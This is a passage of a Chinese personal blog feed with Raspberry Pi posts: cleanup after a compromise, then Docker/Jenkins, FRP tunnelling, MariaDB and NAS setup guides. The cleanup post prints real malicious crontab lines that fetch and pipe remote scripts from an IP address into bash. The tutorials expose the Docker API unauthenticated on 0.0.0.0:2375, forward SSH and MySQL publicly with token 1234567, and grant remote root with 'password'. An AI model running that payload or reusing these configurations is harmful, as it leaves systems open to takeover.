class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这总是一会儿就跪，有定时任务吧，查看定时任务看看有没有什么猫腻</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> <span class="token parameter variable">-l</span><span class="token comment"># 多了这么三行</span>*/30 * * * * <span class="token function">curl</span> <span class="token parameter variable">-A</span> fczyo-cron/1.5 <span class="token parameter variable">-sL</span> http://34.92.166.158:8080/files/xanthe <span class="token operator">|</span> <span class="token function">bash</span> <span class="token parameter variable">-s</span> <span class="token operator">&gt;</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>*/30 * * * * <span class="token function">curl</span> <span class="token parameter variable">-A</span> fczyo-cron/1.5 <span class="token parameter variable">-sL</span> http://34.92.166.158:8080/files/xesa.txt <span class="token operator">|</span> <span class="token function">bash</span> <span class="token parameter variable">-s</span> <span class="token operator">&gt;</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>*/30 * * * * <span class="token function">curl</span> <span class="token parameter variable">-A</span> fczyo-cron/1.5 <span class="token parameter variable">-sL</span> http://34.92.166.158:8080/files/fczyo <span class="token operator">|</span> <span class="token function">bash</span> <span class="token parameter variable">-s</span> <span class="token operator">&gt;</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>卧槽还真有东西！在 windows 打开一个连接立刻就报病毒了！</p><p>立刻编辑定时任务删掉这些不是我添加的定时任务，重启</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> <span class="token parameter variable">-e</span><span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>检查防火墙状态…结果是空的，之前的配置都没了，貌似所有端口都允许访问了, 防火墙被关了…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看防火墙状态</span><span class="token function">sudo</span> ufw status<span class="token comment"># 开启防火墙</span><span class="token function">sudo</span> ufw <span class="token builtin class-name">enable</span><span class="token comment"># 默认全部拒绝</span><span class="token function">sudo</span> ufw default deny<span class="token comment"># 添加自己允许访问的端口</span><span class="token function">sudo</span> ufw allow <span class="token punctuation">..</span>.<span class="token comment"># 检查状态</span><span class="token function">sudo</span> ufw status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给定时任务目录也加锁</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chattr +i /var/spool/cron/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看 <code>lib</code> 是否有多余的包, 对比另一个树莓派，还真有一个 <code>libprocesshider.so</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/local/lib<span class="token function">ls</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看修改创建时间，就昨天创建的。。。赶紧删掉！</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">stat</span> libprocesshider.so<span class="token function">rm</span> <span class="token parameter variable">-f</span> libprocesshider.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>暂时是想不到其他东西了，但还是很害怕，好在这个树莓派里只有几个应用，数据库不在这里…</p><p>还是备份好应用后重装系统保险些，暂时先恢复应用跑起来吧，好歹也写了个简易自动交(kui)易(qian)程序呢，应用停了感觉亏(zhuan)了一个亿！</p><h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><p>回头继续配置内网穿透</p><p>对比另一个树莓派中 <code>rc.local</code> 链接的目标是不存在的，解锁，删除！从另一个树莓派中再拷贝过来，修改配置，加锁重启一气呵成</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chattr <span class="token parameter variable">-i</span> /etc<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/rc.d/rc.local<span class="token function">rm</span> <span class="token parameter variable">-rf</span> rc.local<span class="token function">scp</span> root@192.168.6.130:/etc/rc.local ./rc.local<span class="token function">vim</span> /etc/rc.localchattr +i /etc<span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内网穿透开机自启终于正常工作了，应用也稳定跑起来了</p><p>终于告一段落，有时间重装下系统最稳，不知道还有啥东西被改了呢。。。</p>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
            <tag> 恢复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派安装 Docker 与持续集成~</title>
      <link href="/2020/03/30/dockerinraspberrypi4b/"/>
      <url>/2020/03/30/dockerinraspberrypi4b/</url>
      
        <content type="html"><![CDATA[<p>树莓派 4B 的性能还是很好的，又入手了 8G 版的 4B，性能真么好，当然要好好利用啦！Docker 走起！</p><span id="more"></span><h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><p>直接用一键安装脚本，走你！</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://get.docker.com <span class="token parameter variable">-o</span> get-docker.sh<span class="token function">sudo</span> <span class="token function">sh</span> get-docker.sh<span class="token comment"># 启动服务</span><span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> <span class="token function">docker</span><span class="token comment"># 启动 docker</span><span class="token function">sudo</span> systemctl start <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启 docker api 端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /lib/systemd/system/docker.service<span class="token comment"># 将 ExecStart 配置改为:</span><span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/bin/dockerd <span class="token parameter variable">-H</span> tcp://0.0.0.0:2375 <span class="token parameter variable">-H</span> unix:///var/run/docker.sock<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Jenkins-持续集成"><a href="#Jenkins-持续集成" class="headerlink" title="Jenkins 持续集成"></a>Jenkins 持续集成</h2><h3 id="拉取和启动-Jenkins-镜像"><a href="#拉取和启动-Jenkins-镜像" class="headerlink" title="拉取和启动 Jenkins 镜像"></a>拉取和启动 Jenkins 镜像</h3><p>拉取镜像并跑起来, 树莓派是 <code>ARM</code> 架构的，这里我搭好了一个包含 <code>Maven 3.6.3</code> 和 <code>Oracle JDK8 2.242</code> 的 <code>Jenkins</code> 镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull crazybun/arm-jenkins-jdk8:2.242<span class="token function">docker</span> run <span class="token parameter variable">--name</span> jenkins <span class="token parameter variable">-u</span> root <span class="token parameter variable">-d</span> <span class="token parameter variable">-t</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-v</span> ~/docker_volumes/Jenkins/var/jenkins_home:/var/jenkins_home <span class="token parameter variable">-v</span> /run/docker.sock:/var/run/docker.sock <span class="token parameter variable">-v</span> /usr/bin/docker:/usr/bin/docker <span class="token parameter variable">-p</span> <span class="token number">8080</span>:8080 <span class="token parameter variable">--restart</span> always crazybun/arm-jenkins-jdk8:2.242<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>初始化 Jenkins 省略，百毒一大堆…</p><h2 id="配置-Jenkins-持续集成"><a href="#配置-Jenkins-持续集成" class="headerlink" title="配置 Jenkins 持续集成"></a>配置 Jenkins 持续集成</h2><h3 id="General"><a href="#General" class="headerlink" title="General"></a>General</h3><h4 id="丢弃旧的构建"><a href="#丢弃旧的构建" class="headerlink" title="丢弃旧的构建"></a>丢弃旧的构建</h4><ul><li>保持构建的天数 7</li><li>保持构建的最大个数 5</li></ul><h3 id="源码管理-Git"><a href="#源码管理-Git" class="headerlink" title="源码管理 Git"></a>源码管理 Git</h3><ul><li>Repository URL</li><li>Credentials</li><li>Branches to build: <code>*/baozi</code></li></ul><h3 id="构建触发器"><a href="#构建触发器" class="headerlink" title="构建触发器"></a>构建触发器</h3><ul><li>GitHub hook trigger for GITScm polling</li></ul><h3 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h3><h4 id="调用顶层-Maven-目标"><a href="#调用顶层-Maven-目标" class="headerlink" title="调用顶层 Maven 目标"></a>调用顶层 Maven 目标</h4><ul><li>Maven 版本: 非默认</li><li>目标:<code>-Dfile.encoding=UTF-8 -DskipTests=true clean package</code></li></ul><h4 id="执行-shell"><a href="#执行-shell" class="headerlink" title="执行 shell"></a>执行 shell</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 定义变量</span><span class="token assign-left variable">API_NAME</span><span class="token operator">=</span><span class="token string">"ruoyi"</span><span class="token assign-left variable">API_PORT</span><span class="token operator">=</span><span class="token string">"80"</span><span class="token assign-left variable">IMAGE_NAME</span><span class="token operator">=</span><span class="token string">"crazybun/<span class="token variable">$API_NAME</span>:<span class="token variable">$BUILD_NUMBER</span>"</span><span class="token assign-left variable">CONTAINER_NAME</span><span class="token operator">=</span><span class="token variable">$API_NAME</span><span class="token comment"># 进入target目录并复制Dockerfile文件</span><span class="token builtin class-name">cd</span> <span class="token variable">$WORKSPACE</span>/docker<span class="token comment"># 构建Docker镜像</span><span class="token function">docker</span> build <span class="token parameter variable">-t</span> <span class="token variable">$IMAGE_NAME</span> <span class="token builtin class-name">.</span><span class="token comment"># 推送Docker镜像</span><span class="token comment">#docker push $IMAGE_NAME</span><span class="token comment"># 删除Docker容器</span><span class="token assign-left variable">cid</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token operator">|</span> <span class="token function">grep</span> $CONTAINER_NAME <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print $1}'</span><span class="token variable">)</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> x<span class="token string">"<span class="token variable">$cid</span>"</span> <span class="token operator">!=</span> x <span class="token punctuation">]</span>    <span class="token keyword">then</span>    <span class="token function">docker</span> <span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token variable">$cid</span><span class="token keyword">fi</span><span class="token comment"># 启动Docker容器</span><span class="token function">docker</span> run <span class="token parameter variable">-itd</span> <span class="token parameter variable">--name</span> <span class="token variable">$CONTAINER_NAME</span> <span class="token parameter variable">-v</span> /root/logs/docker-logs/ruoyi:/RuoYi/logs <span class="token parameter variable">-p</span> <span class="token variable">$API_PORT</span>:80 <span class="token parameter variable">--restart</span> always <span class="token variable">$IMAGE_NAME</span><span class="token comment"># 删除Dockerfile文件</span><span class="token comment"># rm -f Dockerfile</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构建后操作"><a href="#构建后操作" class="headerlink" title="构建后操作"></a>构建后操作</h3><ul><li>E-mail: <code>crazybunqnq@gmail.com baobao222222@qq.com</code></li></ul><h3 id="大功告成"><a href="#大功告成" class="headerlink" title="大功告成"></a>大功告成</h3><p>提交个代码/或 git hook 测试下能否正常构建，成功~再也不用在构建部署上费时间了，专注开发 100 年！</p>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 容器 </tag>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派 4B：别让我吃灰~</title>
      <link href="/2020/02/29/raspberrypi4b/"/>
      <url>/2020/02/29/raspberrypi4b/</url>
      
        <content type="html"><![CDATA[<p>树莓派刚出了新版 4B，感觉配置不错，就入手了一个玩玩~然而买回来之后一直在吃灰…赶紧拿出来耍耍~</p><span id="more"></span><h2 id="FRP-内网穿透"><a href="#FRP-内网穿透" class="headerlink" title="FRP 内网穿透"></a>FRP 内网穿透</h2><h3 id="安装-FRP"><a href="#安装-FRP" class="headerlink" title="安装 FRP"></a>安装 FRP</h3><p>不得不夸一下 frp, 太简练了, 做的太好了!</p><ol><li>到其 GitHub 的 <a href="https://github.com/fatedier/frp/releases">release</a> 页面, 下载 相应操作系统及架构的安装压缩包.<ul><li>我的树莓派系统是官方推荐的 Raspbian, 即 32 位的 debian, CPU 是 ARM 架构, 所以下载的软件包是 <a href="https://github.com/fatedier/frp/releases/download/v0.31.2/frp_0.31.2_linux_arm.tar.gz">frp_0.31.2_linux_arm.tar.gz</a></li><li>我的服务器系统是 64 位 CentOS 7,  所以下载的软件包是 <a href="https://github.com/fatedier/frp/releases/download/v0.31.2/frp_0.31.2_linux_amd64.tar.gz">frp_0.31.2_linux_amd64.tar.gz</a></li></ul></li><li>解压下载的软件包, 将其中的<ul><li>frps 及 <code>frps.ini</code> 文件放到具有公网IP的机器上,</li><li>frpc 及 <code>frpc.ini</code> 文件放到处于内网环境的机器上(即我的树莓派上).</li></ul></li></ol><p>只要 2 个文件放在相同目录下, 放在什么位置都行, 当然建立个 frp 目录存放更好.</p><p>至此, 安装完成!</p><blockquote><p>这里不得不吐槽一下, GitHub 下载实在是太慢了!!! 建议服务器端直接从服务器去下载…</p></blockquote><h3 id="FRP-配置"><a href="#FRP-配置" class="headerlink" title="FRP 配置"></a>FRP 配置</h3><p>配置是通过编辑ini文件实现. 下面分别说明服务器和客户端的配置.</p><p>由于有多个二级域名，可以用多个二级域名的 A 记录同时指向外网 VPS 地址</p><ul><li>jenkins.skywind.com -&gt; 202.115.8.1</li><li>gitlab.skywind.com -&gt; 202.115.8.1</li></ul><p>配置两个二级域名都指向 VPS 外网地址，对于多个 http/https 转发，在 frps 那里都可以共用同一个端口</p><h4 id="服务端-FRPS-配置"><a href="#服务端-FRPS-配置" class="headerlink" title="服务端 FRPS 配置:"></a>服务端 FRPS 配置:</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># frps.ini</span><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">7000</span>token <span class="token operator">=</span> <span class="token number">1234567</span>vhost_http_port <span class="token operator">=</span> <span class="token number">80</span>vhost_https_port <span class="token operator">=</span> <span class="token number">443</span>dashboard_port <span class="token operator">=</span> <span class="token number">7500</span>dashboard_user <span class="token operator">=</span> rootdashboard_pwd <span class="token operator">=</span> *****<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>bind_port</code> 指定了 frp 服务端端口</li><li><code>vhost_http_port</code> 指定了 http 服务的端口, 通过访问服务器此端口就可访问到内网中提供的 web 服务</li><li>服务器端 frp 提供了 <code>dashboard</code> 功能, 可监控 frp 的工作状态, 挺好用的. 端口号可指定, 登陆用户名和密码也在这里配置. <code>dashboard</code> 的配置只出现在服务器端, 和客户端没有关系.</li><li><code>token</code> 提供身份验证功能, 服务端和客户端的 <code>common</code> 配置中的 <code>token</code> 参数一致则身份验证通过</li></ul><blockquote><p>用了一堆端口，别忘了设置防火墙哟<br>CentOS 7 使用 firewall-cmd 设置防火墙，这里不赘述了</p></blockquote><h4 id="内网-FRPC-配置"><a href="#内网-FRPC-配置" class="headerlink" title="内网 FRPC 配置"></a>内网 FRPC 配置</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># frpc.ini</span><span class="token punctuation">[</span>common<span class="token punctuation">]</span>admin_addr <span class="token operator">=</span> <span class="token number">127.0</span>.0.1admin_port <span class="token operator">=</span> <span class="token number">7400</span>server_addr <span class="token operator">=</span> <span class="token number">202.115</span>.8.1 server_port <span class="token operator">=</span> <span class="token number">7000</span> token <span class="token operator">=</span> <span class="token number">1234567</span><span class="token punctuation">[</span>jenkins<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> httpslocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">888</span>custom_domains <span class="token operator">=</span> jenkins.skywind.com<span class="token punctuation">[</span>gitlab<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> httpslocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">666</span>custom_domains <span class="token operator">=</span> gitlab.skywind.com<span class="token comment"># 反向代理 ssh</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">22</span>remote_port <span class="token operator">=</span> <span class="token number">6000</span><span class="token comment"># 反向代理数据库</span><span class="token punctuation">[</span>mysql<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">127.0</span>.0.1local_port <span class="token operator">=</span> <span class="token number">3306</span>remote_port <span class="token operator">=</span> <span class="token number">1006</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>common</code> 中的 <code>server_addr</code> 指定了服务器的 IP 地址.</li><li><code>common 中的 </code>server_port<code>必须和服务器端的</code>bind_port` 参数一致.</li><li><code>token</code> 也要一致, 就不赘述了.</li><li><code>ssh</code> 中的 <code>local_port</code> 指定了客户端本机的 ssh 服务端口</li><li><code>ssh</code> 中的 <code>remote_port</code>, 外网可通过访问服务器的此端口来访问客户端的 <code>local_port</code> 端口(上一个参数).</li><li><code>gitlab</code> 和 <code>jenkins</code> 中的 <code>local_ip</code> 为内网某台需要对外开放 web 服务的设备 ip 地址，由于我这两个服务都在树莓派的 docker 里，所以 ip 一样.</li><li><code>gitlab</code> 和 <code>jenkins</code> 中的 <code>local_port</code>, 即内网对外开放的 web 服务端口. 外网访问服务器的 <code>vhost_http_port</code> 端口(见服务器端配置)时, 被映射到内网客户端的此端口, 达到暴漏内网 web 服务的目的.</li><li><code>gitlab</code> 和 <code>jenkins</code> 中的 <code>custom_domains</code> 指定了服务器的域名.</li></ul><p>所以, 整个域名端口映射过程为:</p><ul><li><code>jenkins.skywind.com</code> &lt;—&gt; <code>202.115.8.1</code> &lt;—&gt; <code>树莓派内 docker 容器:888</code></li><li><code>gitlab.skywind.com</code>  &lt;—&gt; <code>202.115.8.1</code> &lt;—&gt; <code>树莓派内 docker 容器:666</code></li><li><code>202.115.8.1:6000</code>  &lt;—&gt;  <code>树莓派 SSH 端口:22</code></li><li><code>202.115.8.1:1006</code>  &lt;—&gt;  <code>树莓派 mysql 端口:3306</code></li></ul><blockquote><p>同样，开了很多端口，如果开了防火墙，记得设置<a href="#%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E8%AE%BE%E7%BD%AE">开启端口(见下文: 防火墙规则设置)</a></p></blockquote><h4 id="服务器端运行"><a href="#服务器端运行" class="headerlink" title="服务器端运行"></a>服务器端运行</h4><p>启动运行很简单, 在 <code>frps</code> 文件所在目录下, 运行如下指令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./frps <span class="token parameter variable">-c</span> ./frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我的服务器端没搞自动运行, 反正服务器难得启动一次.</p><p>搞个后台运行就行了, 我使用的 <code>screen</code>, 也可以用 <code>nohup</code></p><h4 id="客户端运行"><a href="#客户端运行" class="headerlink" title="客户端运行"></a>客户端运行</h4><p>客户端启动运行, 和服务器端类似, 在 <code>frpc</code> 所在目录下, 运行如下指令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./frpc <span class="token parameter variable">-c</span> ./frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于树莓派的掉电不可避免, 还是搞个开机自启动比较好.</p><p>编辑 <code>/etc/rc.local</code> 文件, 在其最后一行 <code>exit 0</code> 之前, 插入如下 2 行:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/sleep <span class="token number">60</span><span class="token function">sudo</span> /root/frp/frpc <span class="token parameter variable">-c</span> /root/frp/frpc.ini <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我的 <code>frpc</code> 文件所在位置是 root 用户下的 frp 目录下, 在 <code>/etc/rc.local</code> 文件中, 要使用绝对路径, <code>&amp;</code> 也必须带上.</p><p>另外, 我在 <code>frpc</code> 运行前, 加了 60 秒的延时, 不加这个延时自启动就会失败…</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://github.com/fatedier/frp/blob/master/README_zh.md">FRP 官方中文文档</a></p><h2 id="安装-MariaDB-数据库"><a href="#安装-MariaDB-数据库" class="headerlink" title="安装 MariaDB 数据库"></a>安装 MariaDB 数据库</h2><h3 id="安装及登录"><a href="#安装及登录" class="headerlink" title="安装及登录"></a>安装及登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mariadb-server <span class="token comment"># 安装</span><span class="token function">sudo</span> mysql_secure_installation <span class="token comment"># 设置 root 密码</span><span class="token function">sudo</span> mysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span> <span class="token comment"># 登陆</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="查看与修改用户登录权限"><a href="#查看与修改用户登录权限" class="headerlink" title="查看与修改用户登录权限"></a>查看与修改用户登录权限</h3><pre class="line-numbers language-mariadb" data-language="mariadb"><code class="language-mariadb">select User, host from mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改用户权限。%表示针对所有IP，password表示将用这个密码登录root用户，如果想只让某个IP段的主机连接，可以修改为</p><pre class="line-numbers language-mariadb" data-language="mariadb"><code class="language-mariadb">GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改立即生效</p><pre class="line-numbers language-mariadb" data-language="mariadb"><code class="language-mariadb">FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> mysql restart <span class="token comment"># 重启 mysql</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装-Jenkins"><a href="#安装-Jenkins" class="headerlink" title="安装 Jenkins"></a>安装 Jenkins</h2><p>先安装 JDK 和 Maven</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> openjdk-8-jdk<span class="token function">apt-get</span> <span class="token function">install</span> maven<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装 Jenkins</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-O</span> - https://pkg.jenkins.io/debian-stable/jenkins.io.key <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑 <code>/etc/apt/sources.list</code> 文件在结尾添加一行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deb https://pkg.jenkins.io/debian-stable binary/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update<span class="token function">apt-get</span> <span class="token function">install</span> jenkins<span class="token function">sudo</span> ufw allow <span class="token number">8080</span> <span class="token comment"># 开启 8080 端口</span><span class="token function">sudo</span> /etc/init.d/jenkins start <span class="token comment"># 启动 jenkins</span><span class="token function">cat</span> /var/lib/jenkins/secrets/initialAdminPassword <span class="token comment"># 查看 Jenkins 初始密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="树莓派-4B-的一些相关配置"><a href="#树莓派-4B-的一些相关配置" class="headerlink" title="树莓派 4B 的一些相关配置"></a>树莓派 4B 的一些相关配置</h2><p>由于树莓派的系统架构是 arm 的, 所以很多东西可能跟平时常用的 Linux 有些区别</p><h3 id="防火墙规则设置"><a href="#防火墙规则设置" class="headerlink" title="防火墙规则设置"></a>防火墙规则设置</h3><p>树莓派使用的防火墙与 Ubuntu 一样, 也是 <code>ufw</code>. <code>ufw</code> 是一个主机端的 <code>iptables</code> 类防火墙配置工具，比较容易上手。如果你有一台暴露在外网的树莓派，则可通过这个简单的配置提升安全性。<br>注意开启常用的默认端口 ssh 端口 22，ftp 端口 20, 21, vnc 端口 1.</p><h4 id="推荐设置"><a href="#推荐设置" class="headerlink" title="推荐设置"></a>推荐设置</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ufw <span class="token comment"># 安装防火墙</span><span class="token function">sudo</span> ufw <span class="token builtin class-name">enable</span> <span class="token comment"># 启用防火墙</span><span class="token function">sudo</span> ufw default deny <span class="token comment"># 默认 关闭所有端口，拒绝所有外部对本机的访问（本机访问外部正常）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>这样设置已经很安全，如果有特殊需要，可以使用 <code>sudo ufw allow</code> 开启相应服务</p></blockquote><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><ol><li><code>sudo ufw disable</code> 关闭</li><li><code>sudo ufw status</code> 查看防火墙状态</li><li><code>sudo ufw allow 80</code> # 允许外部访问 80 端口</li><li><code>sudo ufw delete allow 80</code> # 禁止外部访问 80 端口</li><li><code>sudo ufw allow from 192.168.1.1</code> # 允许此IP访问所有的本机端口</li><li><code>sudo ufw deny smtp</code> # 禁止外部访问 smtp 服务</li><li><code>sudo ufw delete allow smtp</code> # 删除上面建立的某条规则</li><li><code>sudo ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port</code> # 要拒绝所有的流量从 TCP 的 10.0.0.0/8 到端口 22 的地址 192.168.0.1</li><li>sudo ufw allow from 10.0.0.0/8 # 可以允许所有 RFC1918 网络（局域网/无线局域网的）访问这个主机（/8,/16,/12是一种网络分级)</li><li>sudo ufw allow from 172.16.0.0/12</li><li>sudo ufw allow from 192.168.0.0/16<br>配置允许的端口范围&nbsp;</li><li><code>sudo ufw allow&nbsp;6000:6007/tcp</code></li><li><code>sudo ufw allow&nbsp;6000:6007/udp</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
            <tag> 工具 </tag>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派 4B 搭建 NAS</title>
      <link href="/2020/02/29/raspberrypiinstallomv/"/>
      <url>/2020/02/29/raspberrypiinstallomv/</url>
      
        <content type="html"><![CDATA[<p>树莓派刚出了新版 4B，感觉配置不错，就入手了一个玩玩~然而买回来之后一直在吃灰…赶紧拿出来耍耍~</p><span id="more"></span><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> vlc-bin <span class="token parameter variable">-y</span><span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade <span class="token parameter variable">-y</span><span class="token function">sudo</span> <span class="token function">wget</span> <span class="token parameter variable">-O</span> - https://github.com/OpenMediaVault-Plugin-Developers/installScript/raw/master/install <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>保持网络畅通, 耐心等待就好了(整个过程我用了一盘王者的时间)</p><p>安装完成后，打开浏览器，输入树莓派的 IP 地址访问。出现以下页面，及成功安装。</p><p>默认帐号密码</p><p>帐号：admin<br>密码：openmediavault</p><p><del>未完待续</del></p>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 树莓派 </tag>
            
            <tag> 工具 </tag>
            
            <tag> 折腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 IDEA 自带的 HTTP Client 来测试 API</title>
      <link href="/2019/05/04/idea-http-client/"/>
      <url>/2019/05/04/idea-http-client/</url>
      
